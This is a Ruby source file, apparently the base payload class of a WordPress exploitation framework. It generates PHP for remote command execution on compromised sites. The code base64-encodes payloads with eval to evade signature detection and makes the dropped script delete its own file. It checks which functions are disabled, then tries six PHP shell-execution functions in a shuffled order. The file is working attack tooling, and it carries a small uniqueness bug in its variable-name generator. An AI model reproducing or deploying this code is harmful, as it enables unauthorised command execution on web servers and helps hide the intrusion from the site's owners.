require 'base64'

module Wpxf
  # The base class for all payloads.
  class Payload
    include Wpxf::Options

    def initialize
      super

      register_options([
        BooleanOption.new(
          name: 'encode_payload',
          desc: 'Encode the payload to avoid fingerprint detection',
          required: true,
          default: true
        )
      ])
    end

    # @return an encoded version of the payload.
    def encoded
      if normalized_option_value('encode_payload')
        "<?php eval(base64_decode('#{Base64.strict_encode64(raw)}')); ?>"
      else
        "<?php #{raw} ?>"
      end
    end

    # Helper method to escape single quotes in a string.
    # @param val [String] the string with quotes to escape.
    # @return [String] the string with quotes escaped.
    def escape_single_quotes(val)
      val.gsub(/'/) { "\\'" }
    end

    # Generate a random variable name.
    # @return [String] a random name beetween 1 and 9 alpha characters.
    def random_var_name
      Utility::Text.rand_alpha(rand(5..20))
    end

    # Generate a hash of variable names.
    # @param keys [Array] an array of keys.
    # @return [Hash] a hash containing a unique name for each key.
    def generate_vars(keys)
      vars = {}
      keys.each do |key|
        loop do
          var_name = random_var_name
          unless vars.value?(var_name)
            vars[key] = random_var_name
            break
          end
        end
      end
      vars
    end

    # Do any pre-exploit setup required by the payload.
    # @param mod [Module] the module using the payload.
    # @return [Boolean] true if successful.
    def prepare(mod)
      true
    end

    # Run payload specific post-exploit procedures.
    # @param mod [Module] the module using the payload.
    # @return [Boolean] true if successful.
    def post_exploit(mod)
      true
    end

    # Cleanup any allocated resource to the payload.
    def cleanup
    end

    # Run checks to raise warnings to the user of any issues or noteworthy
    # points in regards to the payload being used with the current module.
    # @param mod [Module] the module using the payload.
    def check(mod)
    end

    # @return the payload in its raw format.
    attr_accessor :raw

    private

    def php_preamble(php_vars)
      "@set_time_limit(0); @ignore_user_abort(1);@ini_set('max_execution_time',0); unlink(preg_replace('@\\(.*\\(.*$@', '', __FILE__));
      $#{php_vars[:disabled]}=@ini_get('disable_functions');
      if(!empty($#{php_vars[:disabled]})){
        $#{php_vars[:disabled]}=preg_replace('/[, ]+/', ',', $#{php_vars[:disabled]});
        $#{php_vars[:disabled]}=explode(',', $#{php_vars[:disabled]});
        $#{php_vars[:disabled]}=array_map('trim', $#{php_vars[:disabled]});
      }else{
        $#{php_vars[:disabled]}=array();
      }"
    end

    def exec_methods(php_vars)
      [
        "if (is_callable('shell_exec') && !in_array('shell_exec', $#{php_vars[:disabled]})) {
          $#{php_vars[:output]} = shell_exec($#{php_vars[:cmd]});
        } else ",
        "if (is_callable('passthru') && !in_array('passthru', $#{php_vars[:disabled]})) {
          ob_start();
          passthru($#{php_vars[:cmd]});
          $#{php_vars[:output]} = ob_get_contents();
          ob_end_clean();
        } else ",
        "if (is_callable('system') && !in_array('system', $#{php_vars[:disabled]})) {
          ob_start();
          system($#{php_vars[:cmd]});
          $#{php_vars[:output]} = ob_get_contents();
          ob_end_clean();
        } else ",
        "if (is_callable('exec') && !in_array('exec', $#{php_vars[:disabled]})) {
          $#{php_vars[:output]} = array();
          exec($#{php_vars[:cmd]}, $#{php_vars[:output]});
          $#{php_vars[:output]} = join(chr(10), $#{php_vars[:output]}).chr(10);
        } else",
        "if (is_callable('proc_open') && !in_array('proc_open', $#{php_vars[:disabled]})) {
          $#{php_vars[:handle]} = proc_open($#{php_vars[:cmd]}, array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$#{php_vars[:pipes]});
          $#{php_vars[:output]} = NULL;
          while (!feof($#{php_vars[:pipes]}[1])) {
            $#{php_vars[:output]} .= fread($#{php_vars[:pipes]}[1],1024);
          }
          @proc_close($#{php_vars[:handle]});
        } else ",
        "if (is_callable('popen') && !in_array('popen', $#{php_vars[:disabled]})) {
          $#{php_vars[:fp]} = popen($#{php_vars[:cmd]},'r');
          $#{php_vars[:output]} = NULL;
          if (is_resource($#{php_vars[:fp]})) {
            while (!feof($#{php_vars[:fp]})) {
              $#{php_vars[:output]}.=fread($#{php_vars[:fp]},1024);
            }
          }
          @pclose($#{php_vars[:fp]});
        } else "
      ].shuffle.join('')
    end
  end
end
